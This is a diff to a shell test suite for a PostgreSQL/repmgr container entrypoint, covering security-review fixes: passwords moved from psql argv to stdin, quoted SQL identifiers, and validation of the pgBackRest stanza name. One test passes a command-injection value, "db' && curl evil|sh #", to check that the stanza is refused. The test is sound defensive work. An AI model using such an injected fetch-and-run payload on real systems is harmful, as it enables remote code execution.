@@ -36,17 +36,28 @@ fi
 # that the scram rule rejects ("does not have a valid SCRAM secret"), a startup
 # race that wedges repmgrd / the standby clone. The CREATE/ALTER USER for the
 # managed users must force scram-sha-256 in-session.
-create_repmgr_line=$(grep -E 'CREATE USER \\"\$\{repmgr_user_id\}\\"' "${ROOT}/entrypoint.sh")
-if printf '%s' "${create_repmgr_line}" | grep -q "password_encryption='scram-sha-256'"; then
+# The password-bearing CREATE/ALTER USER go in on STDIN now (#298 security review), so the
+# SET and the CREATE share a heredoc rather than one -c string. Each heredoc opens with the
+# SET, so grep a few lines of context from the opener and assert both appear together.
+scram_block=$(grep -A3 'psql -U postgres -d postgres 2>/dev/null <<SQL' "${ROOT}/entrypoint.sh")
+if printf '%s' "${scram_block}" | grep -q "password_encryption='scram-sha-256'" \
+   && printf '%s' "${scram_block}" | grep -qE 'CREATE USER "\$\{repmgr_user_id\}"'; then
   ok "entrypoint.sh creates the repmgr user with a SCRAM secret"
 else
   bad "entrypoint.sh creates the repmgr user with a SCRAM secret"
 fi
-create_pg_line=$(grep -E 'CREATE USER \\"\$\{pg_user_id\}\\"' "${ROOT}/entrypoint.sh")
-if printf '%s' "${create_pg_line}" | grep -q "password_encryption='scram-sha-256'"; then
+if printf '%s' "${scram_block}" | grep -q "password_encryption='scram-sha-256'" \
+   && printf '%s' "${scram_block}" | grep -qE 'CREATE USER "\$\{pg_user_id\}"'; then
   ok "entrypoint.sh creates the postgres user with a SCRAM secret"
 else
   bad "entrypoint.sh creates the postgres user with a SCRAM secret"
+fi
+# The passwords must NOT be on a psql argv (#298 security review): a `-c "... PASSWORD ..."`
+# leaks them via /proc/<pid>/cmdline. Assert no CREATE/ALTER USER carries PASSWORD on a -c line.
+if grep -E 'psql .*-c .*(CREATE|ALTER) USER' "${ROOT}/entrypoint.sh" | grep -q 'PASSWORD'; then
+  bad "#298: a managed-user password is still passed on the psql command line (visible in /proc)"
+else
+  ok "#298: managed-user passwords are fed on stdin, not the psql command line"
 fi
 
 # --- agent failover mode: entrypoint dispatches "agent" -> pg-ha-agent ---
@@ -333,7 +344,9 @@ if grep -vE '^[[:space:]]*#' "${ROOT}/entrypoint.sh" | grep -q 'CREATE EXTENSION
 else
   ok "#290: entrypoint.sh does not create the repmgr extension"
 fi
-for keep in 'CREATE DATABASE \"${repmgr_db_id}\"' 'CREATE USER \"${repmgr_user_id}\"'; do
+# CREATE DATABASE stays a -c call (no secret), so it keeps the \"...\" shell escaping;
+# CREATE USER moved into a stdin heredoc (#298), where the quotes are literal.
+for keep in 'CREATE DATABASE \"${repmgr_db_id}\"' 'CREATE USER "${repmgr_user_id}"'; do
   if grep -qF "$keep" "${ROOT}/entrypoint.sh"; then
     ok "#290: still creates ${keep} (native needs the role and database for replication auth)"
   else
@@ -405,19 +418,29 @@ rm -rf "${_done_tmp}"
 # fresh directory forever. Folding is wrong independently of the check, too: libpq sends
 # `-U MyApp` verbatim and the server compares it exactly, so a folded role cannot be logged in
 # as at all.
-for pair in 'CREATE DATABASE:pg_db_id' 'CREATE USER:pg_user_id' 'ALTER USER:pg_user_id' \
-            'CREATE DATABASE:repmgr_db_id' 'CREATE USER:repmgr_user_id'; do
-  stmt=${pair%%:*}; var=${pair##*:}
-  # The needle carries the BACKSLASHES too: these statements live inside a double-quoted
-  # shell string in entrypoint.sh, so the file literally contains \"${var}\".
-  if grep -qF "${stmt} "'\"'"\${${var}}"'\"' "${ROOT}/entrypoint.sh"; then
+# CREATE DATABASE is still a -c call inside a double-quoted shell string, so the file
+# literally contains \"${var}\". CREATE/ALTER USER moved into a stdin heredoc (#298 security
+# review), where the identifier quotes are literal ("${var}", no backslashes). Either way the
+# identifier must be QUOTED with its double-quote-escaped copy.
+for pair in 'CREATE DATABASE:pg_db_id:esc' 'CREATE USER:pg_user_id:raw' 'ALTER USER:pg_user_id:raw' \
+            'CREATE DATABASE:repmgr_db_id:esc' 'CREATE USER:repmgr_user_id:raw'; do
+  stmt=${pair%%:*}; rest=${pair#*:}; var=${rest%%:*}; form=${rest##*:}
+  if [ "$form" = "esc" ]; then
+    needle="${stmt} "'\"'"\${${var}}"'\"'
+  else
+    needle="${stmt} "'"'"\${${var}}"'"'
+  fi
+  if grep -qF "$needle" "${ROOT}/entrypoint.sh"; then
     ok "#298: ${stmt} quotes its identifier (\${${var}})"
   else
     bad "#298: ${stmt} interpolates an UNQUOTED identifier; PostgreSQL would fold it to lower case"
   fi
 done
-# Nothing may interpolate the raw env vars into SQL -- those are the unescaped values.
-if grep -E 'psql .*(CREATE|ALTER|GRANT)' "${ROOT}/entrypoint.sh" \
+# Nothing may interpolate the raw env vars into SQL -- those are the unescaped values. The
+# CREATE/ALTER USER SQL is now on heredoc body lines, not `psql ...` lines, so scan every
+# CREATE/ALTER/GRANT line (any prefix) for a raw name env var rather than only psql -c lines.
+if grep -vE '^[[:space:]]*#' "${ROOT}/entrypoint.sh" \
+     | grep -E '(CREATE|ALTER|GRANT).*(DATABASE|USER|PRIVILEGES)' \
      | grep -qE '\$\{(POSTGRES_USER|POSTGRES_DB|REPMGR_USER|REPMGR_DB)\}'; then
   bad "#298: a bootstrap SQL statement still interpolates a raw name env var instead of its escaped copy"
 else
@@ -448,10 +471,12 @@ REPMGR_USER=RepMgr REPMGR_DB=RepMgrDB REPMGR_PASSWORD=pw Q_SQL="${_q_sql}" bash 
   source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
   initdb() { mkdir -p "$PGDATA"; echo 18 > "$PGDATA/PG_VERSION"; }
   pg_ctl() { :; }
-  # Record every -c payload, and answer the verification SELECTs affirmatively.
-  psql() { for a in "$@"; do :; done; local sql=""; while [ $# -gt 0 ]; do [ "$1" = "-c" ] && sql=$2; [ "$1" = "-tAc" ] && sql=$2; shift; done
-           printf "%s\n" "$sql" >> "$Q_SQL"; case "$sql" in SELECT*) echo 1;; esac; }
-  bootstrap_initdb' >/dev/null 2>&1 || true
+  # Record every -c payload AND any heredoc on stdin (the password-bearing CREATE/ALTER USER
+  # go in on stdin since #298), then answer the verification SELECTs affirmatively.
+  psql() { local sql=""; while [ $# -gt 0 ]; do [ "$1" = "-c" ] && sql=$2; [ "$1" = "-tAc" ] && sql=$2; shift; done
+           local stdin_sql; stdin_sql=$(cat)
+           printf "%s\n" "$sql" "$stdin_sql" >> "$Q_SQL"; case "$sql" in SELECT*) echo 1;; esac; }
+  bootstrap_initdb' </dev/null >/dev/null 2>&1 || true
 if grep -qF 'CREATE USER "MyApp"' "${_q_sql}" 2>/dev/null && grep -qF 'CREATE USER "RepMgr"' "${_q_sql}" 2>/dev/null; then
   ok "#298: an uppercase POSTGRES_USER/REPMGR_USER keeps its case in the CREATE statements"
 else
@@ -565,6 +590,36 @@ else
   bad "#298: a stale in-progress marker survived a successful bootstrap"
 fi
 rm -rf "${_bd1}" "${_bd2}" "${_bd3}"
+
+# --- #298 security review: PGBACKREST_STANZA is validated before the GUC write ---
+# The stanza is interpolated into single-quoted archive_command/restore_command GUCs, so a
+# single quote would close the string and hand the rest to the archiver's /bin/sh. bootstrap
+# must FAIL closed on a stanza carrying anything outside [A-Za-z0-9_-].
+_sz=$(mktemp -d); mkdir -p "${_sz}/bad" "${_sz}/good"
+if PGDATA="${_sz}/bad" POSTGRES_USER=app POSTGRES_DB=app POSTGRES_PASSWORD=pw \
+   REPMGR_USER=repmgr REPMGR_DB=repmgr REPMGR_PASSWORD=pw \
+   PGBACKREST_ENABLED=true PGBACKREST_STANZA="db' && curl evil|sh #" bash -c '
+     source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
+     initdb() { echo 18 > "$PGDATA/PG_VERSION"; }; pg_ctl() { :; }; psql() { :; }
+     bootstrap_initdb' </dev/null >/dev/null 2>&1; then
+  bad "#298: a PGBACKREST_STANZA carrying a quote was accepted (archive_command injection)"
+else
+  ok "#298: a PGBACKREST_STANZA carrying a quote is refused before the GUC write"
+fi
+# A plain stanza must NOT trip the guard (it may fail later for unrelated reasons; assert only
+# that the archive_command it would write carries the clean name).
+if PGDATA="${_sz}/good" POSTGRES_USER=app POSTGRES_DB=app POSTGRES_PASSWORD=pw \
+   REPMGR_USER=repmgr REPMGR_DB=repmgr REPMGR_PASSWORD=pw \
+   PGBACKREST_ENABLED=true PGBACKREST_STANZA="prod-db_1" bash -c '
+     source <(sed -n "/^bootstrap_initdb() {/,/^}/p" '"${ROOT}"'/entrypoint.sh)
+     initdb() { echo 18 > "$PGDATA/PG_VERSION"; }; pg_ctl() { :; }; psql() { :; }
+     bootstrap_initdb' </dev/null >/dev/null 2>&1
+   grep -q "stanza=prod-db_1" "${_sz}/good/postgresql.conf" 2>/dev/null; then
+  ok "#298: a valid PGBACKREST_STANZA passes the guard and reaches archive_command"
+else
+  bad "#298: a valid PGBACKREST_STANZA was rejected or not written to archive_command"
+fi
+rm -rf "${_sz}"
 
 [ "$fail" -eq 0 ] && echo "ALL TESTS PASSED" || echo "TESTS FAILED"
 exit "$fail"
